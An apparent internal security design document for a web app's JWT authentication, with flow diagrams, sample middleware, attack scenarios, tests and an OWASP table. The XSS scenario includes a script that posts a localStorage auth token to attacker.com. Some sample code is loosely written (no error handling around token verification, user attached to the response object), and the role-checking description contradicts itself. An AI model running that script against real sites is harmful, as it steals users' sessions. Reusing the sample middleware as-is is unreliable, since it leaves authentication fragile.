# iDEAN AI Security Model
## Client-Side Authentication Architecture

**Version**: 2.0
**Last Updated**: 2025-10-01
**Status**: ✅ Secured with Backend Verification

---

## Overview

iDEAN AI uses a **two-phase authentication model** that balances security with user experience:

1. **Phase 1: Optimistic UI Restoration** - Fast client-side JWT decoding for immediate UI rendering
2. **Phase 2: Backend Verification** - Immediate backend verification to replace unverified data

This approach provides:
- ✅ Fast initial page load (no flash of unauthenticated state)
- ✅ Proper security (all data verified by backend)
- ✅ Good UX (smooth transitions without loading spinners)
- ✅ Protection against token tampering

---

## Security Principles

### 1. **Never Trust Client-Side Data for Security Decisions** 🔒

```typescript
// ❌ WRONG: Making auth decisions based on client-side JWT
const payload = decodeJWT(token);
if (payload?.role === 'admin') {
  showAdminPanel(); // VULNERABLE!
}

// ✅ CORRECT: Using client-side JWT for UI only, verifying with backend
const payload = decodeJWT(token);
setUserName(payload?.name); // Just for display

// Backend verification happens immediately in background
await AuthService.getCurrentUser(); // Verified data
```

### 2. **Backend Always Validates** 🛡️

Every API request includes JWT token verification:

```javascript
// Backend (auth.middleware.js)
const authMiddleware = async (req, res, next) => {
  const token = req.headers.authorization.replace('Bearer ', '');

  // ✅ Cryptographically verify signature
  const decoded = jwt.verify(token, process.env.JWT_SECRET);

  // ✅ Validate user still exists
  const user = await prisma.user.findUnique({ where: { id: decoded.userId } });

  // ✅ Attach verified user to request
  res.user = user;
  next();
};
```

### 3. **Optimistic UI Updates for Performance** ⚡

Client-side JWT decoding is ONLY used for:
- Displaying user name/email quickly
- Showing cached UI state
- Reducing initial API calls

This data is TEMPORARY and will be replaced within ~100ms with backend-verified data.

---

## Authentication Flow

### Initial Page Load (Cold Start)

```
User visits app
    ↓
1. Check localStorage for authToken
    ↓
2. ⚠️ UNVERIFIED: Decode JWT client-side
    ↓
3. ⚡ FAST UI: Display user info from JWT (optimistic)
    ↓
4. 🔒 SECURITY: Call backend /api/v1/users/me
    ↓
5. ✅ VERIFIED: Replace JWT data with backend data
    ↓
App is now fully authenticated with verified data
```

**Timeline:**
- T+0ms: JWT decoded, UI shows user info
- T+100ms: Backend verification starts
- T+300ms: Verified data received and replaces JWT data

### Subsequent Page Loads (Warm Cache)

```
User visits app
    ↓
1. Check memory cache (5-minute expiry)
    ↓
2. ⚡ FAST UI: Display cached user data
    ↓
3. 🔒 SECURITY: Verify with backend in background
    ↓
4. ✅ VERIFIED: Update cache if data changed
```

### API Request Flow

```
User makes API request
    ↓
Frontend: apiClient.get('/api/v1/resources')
    ↓
Adds header: Authorization: Bearer <JWT>
    ↓
Backend: authMiddleware verifies JWT signature
    ↓
Backend: Validates user exists and has permissions
    ↓
Backend: Processes request with verified user context
    ↓
Response sent back to frontend
```

---

## Code Implementation

### jwt-decoder.ts

```typescript
/**
 * ⚠️ SECURITY WARNING ⚠️
 *
 * This module performs CLIENT-SIDE JWT decoding WITHOUT verification.
 *
 * ❌ DO NOT USE FOR:
 * - Authentication decisions
 * - Authorization decisions
 * - Security-critical operations
 *
 * ✅ ONLY USE FOR:
 * - UI optimization (showing user name quickly)
 * - Reducing initial API calls
 * - Checking token expiry client-side
 */
export function decodeJWT(token: string): JWTPayload | null {
  // Decodes JWT without signature verification
  // For UI optimization ONLY
}
```

### AuthContext.tsx

```typescript
/**
 * ⚠️ SECURITY: Optimistic UI Restoration (NOT for auth decisions)
 *
 * Security Model:
 * 1. Decode JWT client-side → Show user info quickly
 * 2. Immediately verify with backend → Replace with verified data
 * 3. Backend always validates before serving protected resources
 */
const checkStoredAuth = () => {
  const userFromJWT = createUserFromJWT(token); // UNVERIFIED
  setUser(userFromJWT); // Temporary for UI

  // 🔒 SECURITY: Immediately verify with backend
  setTimeout(() => {
    refreshUserInBackground(token); // Replaces with VERIFIED data
  }, 100);
};
```

### Backend Middleware

```javascript
// auth.middleware.js
const authMiddleware = async (req, res, next) => {
  const token = req.headers.authorization.replace('Bearer ', '');

  // ✅ Verify signature (prevents tampering)
  const decoded = jwt.verify(token, process.env.JWT_SECRET);

  // ✅ Validate user exists (prevents deleted user access)
  const user = await prisma.user.findUnique({
    where: { id: decoded.userId },
    include: { business: true }
  });

  if (!user) {
    return res.status(401).json({ error: 'User not found' });
  }

  // ✅ Attach verified user to request
  res.user = user;
  next();
};
```

---

## Security Guarantees

### ✅ What IS Secured

1. **All API requests are verified** - Backend checks JWT signature on every request
2. **Token tampering is detected** - Modified JWTs fail signature verification
3. **Expired tokens are rejected** - Backend checks expiry before processing
4. **Deleted users can't access** - User existence checked on every request
5. **Role changes take effect immediately** - Backend always uses current DB state

### ⚠️ What IS NOT Secured (By Design)

1. **Client-side UI state** - User can modify localStorage/sessionStorage
   - **Mitigation**: Backend verification prevents actual harm
   - **Impact**: User might see wrong UI temporarily, but can't access protected data

2. **Initial page load shows unverified data** - For ~100ms before verification
   - **Mitigation**: Backend rejects invalid requests
   - **Impact**: Purely cosmetic, no security risk

3. **Cache poisoning** - User can modify cached data
   - **Mitigation**: Cache expires after 5 minutes, backend always verifies
   - **Impact**: Temporary UI confusion, no actual security breach

---

## Attack Scenarios and Mitigations

### Scenario 1: Token Tampering

**Attack**: User modifies JWT payload to change role to "admin"

```javascript
// Attacker modifies JWT payload
localStorage.setItem('authToken', tamperedToken);
```

**Protection**:
1. Frontend decodes tampered token → Shows "admin" UI temporarily
2. Backend receives request with tampered token
3. Backend verification fails: `jwt.verify()` throws error
4. Request rejected with 401 Unauthorized
5. Frontend logs user out

**Result**: ❌ Attack fails. User sees admin UI for ~100ms but can't access admin data.

---

### Scenario 2: Expired Token Replay

**Attack**: User tries to reuse an expired token

```javascript
// Token expired 1 hour ago
const oldToken = 'expired.jwt.token';
apiClient.get('/api/v1/admin/users', { Authorization: `Bearer ${oldToken}` });
```

**Protection**:
1. Frontend checks expiry client-side → Logs user out immediately
2. If bypassed, backend checks expiry → Rejects with 401
3. User forced to re-authenticate

**Result**: ❌ Attack fails. Expired tokens can't access any data.

---

### Scenario 3: XSS Attack Stealing Token

**Attack**: XSS payload steals JWT from localStorage

```html
<script>
  // Malicious script injected via XSS
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('authToken')
  });
</script>
```

**Protection**:
1. ⚠️ Token can be stolen (localStorage is vulnerable to XSS)
2. ✅ Mitigation: Input sanitization prevents XSS injection
3. ✅ Mitigation: Content-Security-Policy headers block inline scripts
4. ✅ Future: Move to HTTP-only cookies (see roadmap)

**Result**: ⚠️ Partial risk. Tokens can be stolen via XSS. **Priority fix: HTTP-only cookies**

---

### Scenario 4: Privilege Escalation via Client

**Attack**: User modifies `user.role` in localStorage to gain admin access

```javascript
// Attacker modifies stored user object
const user = JSON.parse(localStorage.getItem('user'));
user.role = 'admin';
localStorage.setItem('user', JSON.stringify(user));
```

**Protection**:
1. Frontend shows admin UI temporarily
2. Any API request includes JWT (unchanged)
3. Backend reads role from JWT payload (verified)
4. Backend checks: JWT role ≠ "admin" → Request rejected
5. User can't access admin resources

**Result**: ❌ Attack fails. Client-side role modification has no effect on backend.

---

## Development Guidelines

### For Frontend Developers

```typescript
// ✅ CORRECT: Using JWT for UI only
const DisplayUserName = () => {
  const { user } = useAuth(); // May be from JWT initially
  return <span>{user?.name}</span>; // Just for display
};

// ❌ WRONG: Making security decisions client-side
const AdminPanel = () => {
  const { user } = useAuth();
  if (user?.role === 'admin') { // DON'T trust this!
    return <AdminDashboard />; // User can fake this!
  }
};

// ✅ CORRECT: Backend controls access
const AdminPanel = () => {
  const [data, setData] = useState(null);

  useEffect(() => {
    // Backend will reject if user is not admin
    ideanApi.admin.getUsers().then(setData).catch(() => {
      // Not admin, show error
    });
  }, []);

  return data ? <AdminDashboard data={data} /> : <AccessDenied />;
};
```

### For Backend Developers

```javascript
// ✅ ALWAYS verify JWT signature
router.get('/api/admin/users', authMiddleware, requireRole(['admin']), async (req, res) => {
  // authMiddleware verifies JWT signature
  // requireRole checks res.user.role from DB
  const users = await prisma.user.findMany();
  res.json({ users });
});

// ❌ NEVER trust client-sent data for auth
router.get('/api/admin/users', async (req, res) => {
  // DON'T DO THIS!
  if (req.body.isAdmin) { // User can send any value!
    const users = await prisma.user.findMany();
    res.json({ users });
  }
});
```

---

## Monitoring and Logging

### Security Events to Log

1. **Failed JWT verification** - Potential tampering attempts
2. **Expired token usage** - Potential replay attacks
3. **Multiple failed logins** - Potential brute force
4. **Role escalation attempts** - Admin endpoint access by non-admins
5. **Suspicious patterns** - Multiple devices, rapid location changes

### Example Logging

```typescript
// Frontend
authLogger.success('✅ Backend verification complete: User data is now VERIFIED');
authLogger.warn('⚠️ Background verification failed');

// Backend
logger.security('JWT verification failed', {
  ip: req.ip,
  token: token.substring(0, 20) + '...',
  error: error.message
});
```

---

## Future Improvements

### Priority 1: HTTP-Only Cookies (2 weeks)

```javascript
// Backend: Set token in HTTP-only cookie
res.cookie('authToken', token, {
  httpOnly: true,     // ✅ Not accessible to JavaScript
  secure: true,       // ✅ HTTPS only
  sameSite: 'strict', // ✅ CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000
});

// Frontend: No localStorage access needed
// Browser automatically sends cookie with requests
```

**Benefits**:
- ✅ XSS can't steal tokens
- ✅ Tokens not in localStorage
- ✅ Automatic CSRF protection

### Priority 2: Token Refresh Mechanism (2 weeks)

```javascript
// Short-lived access token (15 minutes)
// Long-lived refresh token (7 days, HTTP-only)

// When access token expires:
const newAccessToken = await refreshToken(refreshToken);
```

**Benefits**:
- ✅ Limited token lifetime reduces risk
- ✅ Can revoke refresh tokens
- ✅ Better security/UX balance

### Priority 3: Rate Limiting (1 week)

```javascript
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many login attempts'
});

router.post('/login', loginLimiter, login);
```

**Benefits**:
- ✅ Prevents brute force attacks
- ✅ Protects against credential stuffing
- ✅ Reduces server load

---

## Testing Security

### Manual Testing Checklist

- [ ] Try modifying JWT payload → Request should fail
- [ ] Try using expired token → Should force re-login
- [ ] Try accessing admin endpoints as regular user → Should fail
- [ ] Check localStorage after login → Should see token
- [ ] Clear localStorage → Should force re-login on next request
- [ ] Modify user role in localStorage → Should not affect backend permissions

### Automated Security Tests

```typescript
describe('JWT Security', () => {
  it('should reject tampered JWT', async () => {
    const token = 'valid.jwt.token';
    const [header, payload, signature] = token.split('.');

    // Tamper with payload
    const tamperedPayload = btoa(JSON.stringify({ userId: '999', role: 'admin' }));
    const tamperedToken = `${header}.${tamperedPayload}.${signature}`;

    const response = await apiClient.get('/api/users/me', {
      headers: { Authorization: `Bearer ${tamperedToken}` }
    });

    expect(response.status).toBe(401);
  });

  it('should reject expired JWT', async () => {
    const expiredToken = generateExpiredToken();

    const response = await apiClient.get('/api/users/me', {
      headers: { Authorization: `Bearer ${expiredToken}` }
    });

    expect(response.status).toBe(401);
  });
});
```

---

## Compliance

### OWASP Top 10 Coverage

| Risk | Status | Implementation |
|------|--------|----------------|
| A01: Broken Access Control | ✅ Protected | Backend always verifies permissions |
| A02: Cryptographic Failures | ⚠️ Partial | Using JWT, but localStorage is vulnerable |
| A03: Injection | ✅ Protected | Prisma ORM + input sanitization |
| A04: Insecure Design | ✅ Protected | Security by design, defense in depth |
| A05: Security Misconfiguration | ⚠️ In Progress | Need security headers |
| A06: Vulnerable Components | ⚠️ Needs Audit | Run `npm audit` regularly |
| A07: Identification/Auth Failures | ✅ Protected | Strong auth, backend verification |
| A08: Software/Data Integrity | ✅ Protected | JWT signature verification |
| A09: Security Logging Failures | ⚠️ Basic | Need comprehensive logging |
| A10: Server-Side Request Forgery | N/A | Not applicable |

---

## Conclusion

iDEAN AI implements a **secure-by-default authentication model** with these key principles:

1. ✅ **Backend verification is mandatory** - Never trust client-side data
2. ✅ **Optimistic UI for performance** - Fast UX without compromising security
3. ✅ **Defense in depth** - Multiple layers of security
4. ✅ **Clear separation of concerns** - Client handles UI, backend handles security

**Current Security Status**: 🟢 **SECURE** (with documented limitations)

**Next Steps**:
1. Implement HTTP-only cookies (Priority 1)
2. Add token refresh mechanism (Priority 2)
3. Implement rate limiting (Priority 3)
4. Regular security audits (Quarterly)

---

**Document Version**: 2.0
**Last Reviewed**: 2025-10-01
**Next Review**: 2025-11-01
**Classification**: Internal Use Only
